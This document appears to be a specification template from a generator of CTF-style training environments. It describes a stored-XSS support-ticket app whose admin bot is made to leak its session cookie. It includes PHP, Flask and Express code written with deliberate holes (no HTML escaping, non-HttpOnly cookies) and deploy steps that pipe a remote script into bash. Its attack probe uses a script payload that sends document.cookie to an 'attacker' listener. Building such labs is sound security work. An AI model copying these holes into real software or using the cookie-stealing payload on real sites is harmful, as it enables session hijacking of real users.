---
id: xss_admin_bot
type: web_vulnerability
description: A stored XSS vulnerability exploited via an admin bot (headless browser with authenticated session). The attacker injects JavaScript that exfiltrates the admin's session cookie to an attacker-controlled listener, enabling session hijacking and access to admin-only functionality.
required_vars: []
---
# Atom: Admin-Bot XSS (Session Theft)

User-supplied input is stored and rendered unsanitized in an HTML page (identical to standard stored XSS). The critical difference is that the application has an **admin bot** — a headless Chromium browser that periodically or on-demand visits user-submitted content while authenticated as an admin. When the bot renders the page, the injected JavaScript executes in the bot's browser context, which has access to the admin's session cookie. The payload exfiltrates this cookie to an attacker-controlled HTTP listener.

This atom models a realistic CTF-style XSS challenge where the vulnerability is only exploitable through a browser (not detectable via curl+grep of HTML source alone). The admin bot is a Node.js/Puppeteer script deployed alongside the web application on the target.

### Logic Requirements:
1. User input is saved to a database or file via a POST endpoint and later rendered into an HTML page **without HTML encoding** — standard stored XSS.
2. The application has an authentication system with at least two roles: a regular user and an admin. Login sets a **session cookie that is NOT HttpOnly** (critical — `document.cookie` must be able to read it).
3. An admin-only page or functionality exists, gated by the session cookie. This gives value to stealing the admin's cookie.
4. An **admin bot** Node.js script (`admin_bot.js`) uses Puppeteer to: launch headless Chromium, navigate to the login page, authenticate as admin (hardcoded credentials), then navigate to the page that renders user-submitted content.
5. A `/trigger-review` endpoint (or similar) spawns the admin bot as a child process when called. This avoids cron complexity and makes the bot triggerable by the attacker during testing.
6. The session cookie is readable by JavaScript (`document.cookie`) and can be exfiltrated via `fetch()`, `new Image().src`, or `XMLHttpRequest` to an external URL.

### Synthesis Guidance:

The natural cover story is a **support ticket system**, **feedback form**, or **bug report portal** — any feature where users submit content that an admin reviews. The admin bot simulates the admin clicking "review submissions."

**CRITICAL: The session cookie MUST NOT be HttpOnly.** If the cookie has the `HttpOnly` flag, `document.cookie` returns an empty string and the entire attack chain breaks. Explicitly set `httpOnly: false` (Express), omit the `httponly` parameter (PHP `setcookie`), or set `SESSION_COOKIE_HTTPONLY = False` (Flask).

**Admin Bot Installation (deploy_snippet must include):**

The deploy_snippet must install Node.js, Puppeteer, and Chromium's shared library dependencies. Use the system Chromium package rather than Puppeteer's bundled download for reliability in Docker:

```bash
# Install Node.js 20 via NodeSource (NOT apt default which is v12)
apt-get update -qq
curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
DEBIAN_FRONTEND=noninteractive apt-get install -y nodejs

# Install Chromium and its dependencies (system package, ~200MB)
DEBIAN_FRONTEND=noninteractive apt-get install -y chromium-browser \
  libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 \
  libxkbcommon0 libxcomposite1 libxdamage1 libxfixes3 \
  libxrandr2 libgbm1 libpango-1.0-0 libcairo2 libasound2

# CRITICAL: install ALL npm dependencies in the app directory BEFORE starting
cd /opt/webapp
npm init -y
npm install express better-sqlite3 cookie-parser  # app dependencies
PUPPETEER_SKIP_DOWNLOAD=true npm install puppeteer  # admin bot dependency
```

**CRITICAL: The deploy_snippet MUST run `npm init -y && npm install <all-packages>` in /opt/webapp BEFORE starting the app.** If the app uses Express, `better-sqlite3`, `cookie-parser`, `mysql2`, or any other npm package, ALL of them must be installed via `npm install` in the same step. Missing this causes "Cannot find module" errors at runtime.

The admin_bot.js script must set the executable path to the system Chromium:

```javascript
const browser = await puppeteer.launch({
  headless: 'new',
  executablePath: '/usr/bin/chromium-browser',
  args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
});
```

**The admin bot script (`admin_bot.js`) must be embedded in deploy_snippet as a heredoc** and written to the app directory (e.g., `/opt/webapp/admin_bot.js`).

**PHP (Apache + MySQL) — app + separate Node bot:**

The app is a PHP application. The admin bot is a standalone Node.js script. The `/trigger-review` endpoint calls `exec('node /opt/webapp/admin_bot.js')`.

```php
// Login endpoint — sets session cookie (NOT HttpOnly)
session_start();
if ($_POST['user'] === 'admin' && $_POST['pass'] === $admin_password) {
    $_SESSION['role'] = 'admin';
    setcookie('admin_token', bin2hex(random_bytes(16)), 0, '/', '', false, false);
    // Last param (httponly) is false ^^^
}

// Submit endpoint — stores user content unsanitized
$stmt = $pdo->prepare("INSERT INTO tickets (content) VALUES (?)");
$stmt->execute([$_POST['content']]);

// View endpoint — renders stored content without encoding
$rows = $pdo->query("SELECT content FROM tickets")->fetchAll();
foreach ($rows as $row) {
    echo "<div class='ticket'>" . $row['content'] . "</div>";  // NO htmlspecialchars()
}

// Trigger endpoint — spawns admin bot
if ($_SERVER['REQUEST_URI'] === '/trigger-review') {
    exec('node /opt/webapp/admin_bot.js > /dev/null 2>&1 &');
    echo json_encode(['status' => 'reviewing']);
}
```

```javascript
// admin_bot.js for PHP app
const puppeteer = require('puppeteer');
(async () => {
    const browser = await puppeteer.launch({
        headless: 'new',
        executablePath: '/usr/bin/chromium-browser',
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
    });
    const page = await browser.newPage();
    // Login as admin
    await page.goto('http://localhost/login.php');
    await page.type('input[name="user"]', 'admin');
    await page.type('input[name="pass"]', 'ADMIN_PASSWORD_HERE');
    await page.click('input[type="submit"]');
    await page.waitForNavigation();
    // Visit the page with user submissions (XSS fires here)
    await page.goto('http://localhost/tickets.php');
    await new Promise(r => setTimeout(r, 5000));  // wait for JS execution + exfil
    await browser.close();
})();
```

**Python / Flask — app + separate Node bot:**

```python
from flask import Flask, request, session, make_response, redirect
import subprocess, sqlite3, os

app = Flask(__name__)
app.secret_key = os.urandom(24)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['user'] == 'admin' and request.form['pass'] == ADMIN_PASS:
            session['role'] = 'admin'
            resp = make_response(redirect('/admin'))
            resp.set_cookie('admin_token', os.urandom(16).hex(),
                            httponly=False)  # NOT HttpOnly!
            return resp
    return '<form method=post><input name=user><input name=pass type=password><button>Login</button></form>'

@app.route('/submit', methods=['POST'])
def submit():
    conn = sqlite3.connect('app.db')
    conn.execute("INSERT INTO tickets (content) VALUES (?)", (request.form['content'],))
    conn.commit()
    return 'Submitted'

@app.route('/tickets')
def tickets():
    conn = sqlite3.connect('app.db')
    rows = conn.execute("SELECT content FROM tickets").fetchall()
    html = '<h1>Tickets</h1>'
    for row in rows:
        html += f"<div>{row[0]}</div>"  # NO escaping
    return html

@app.route('/trigger-review', methods=['GET', 'POST'])
def trigger():
    subprocess.Popen(['node', '/opt/webapp/admin_bot.js'])
    return '{"status": "reviewing"}'
```

**Node.js / Express — app with integrated bot:**

```javascript
const express = require('express');
const { exec } = require('child_process');
const sqlite3 = require('better-sqlite3');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

app.post('/login', (req, res) => {
    if (req.body.user === 'admin' && req.body.pass === ADMIN_PASS) {
        // NOT HttpOnly — vulnerable to document.cookie theft
        res.cookie('admin_token', crypto.randomBytes(16).toString('hex'), {
            httpOnly: false,
        });
        return res.redirect('/admin');
    }
    res.status(401).send('Invalid');
});

app.post('/submit', (req, res) => {
    db.prepare("INSERT INTO tickets (content) VALUES (?)").run(req.body.content);
    res.send('Submitted');
});

app.get('/tickets', (req, res) => {
    const rows = db.prepare("SELECT content FROM tickets").all();
    // NO encoding — XSS vulnerability
    res.send(rows.map(r => `<div>${r.content}</div>`).join(''));
});

app.get('/trigger-review', (req, res) => {
    exec('node /opt/webapp/admin_bot.js');
    res.json({ status: 'reviewing' });
});
```

### Testing Guidance:

**Layer 1 — Internal state check (runs inside target container):**

Verify the individual components work without testing the full exfiltration chain:

```bash
# 1. Verify app is running
curl -s -o /dev/null -w '%{http_code}' http://localhost:PORT/

# 2. Verify stored XSS — payload survives storage and is reflected unencoded
curl -s -X POST http://localhost:PORT/submit -d "content=<img src=x onerror=alert(1)>"
curl -s http://localhost:PORT/tickets | grep '<img src=x onerror=alert(1)>'

# 3. Verify admin authentication works and sets a non-HttpOnly cookie
curl -s -c /tmp/cookies.txt -X POST http://localhost:PORT/login \
  -d "user=admin&pass=ADMIN_PASSWORD"
grep -i 'admin_token\|session' /tmp/cookies.txt

# 4. Verify admin bot script exists and Chromium launches
node /opt/webapp/admin_bot.js --test 2>&1 || \
  node -e "const p=require('puppeteer'); p.launch({headless:'new',executablePath:'/usr/bin/chromium-browser',args:['--no-sandbox']}).then(b=>{console.log('browser launched');b.close()})"

# 5. Verify trigger endpoint responds
curl -s http://localhost:PORT/trigger-review | grep -i 'review'
```

**Layer 2 — External attack probe (runs from attacker container):**

Full attack chain — start listener, inject XSS, trigger bot, capture cookie:

```bash
# 1. Start a listener to catch exfiltrated cookies
python -m http.server 9999 > /tmp/exfil.txt &
LISTENER_PID=$!
echo "Listener started with PID $LISTENER_PID"

# 2. Inject XSS payload that exfiltrates document.cookie to our listener
curl -s -X POST "http://target:PORT/submit" \
  --data-urlencode "content=<script>new Image().src='http://attacker:9999/?c='+document.cookie</script>"

# 3. Trigger the admin bot to visit the page containing our payload
curl -s "http://target:PORT/trigger-review"

# 4. Wait for the bot to execute JavaScript and exfiltration to arrive
sleep 15

# 5. Kill listener and check captured data
kill $LISTENER_PID 2>/dev/null
wait $LISTENER_PID 2>/dev/null
echo "=== Exfiltrated data ==="
cat /tmp/exfil.txt
grep -iE 'admin_token|session' /tmp/exfil.txt
```

A successful result shows the admin's session cookie (e.g., `admin_token=a3f8...`) in the captured data, confirming the XSS payload executed in the admin bot's browser and exfiltrated `document.cookie` to the attacker's listener.
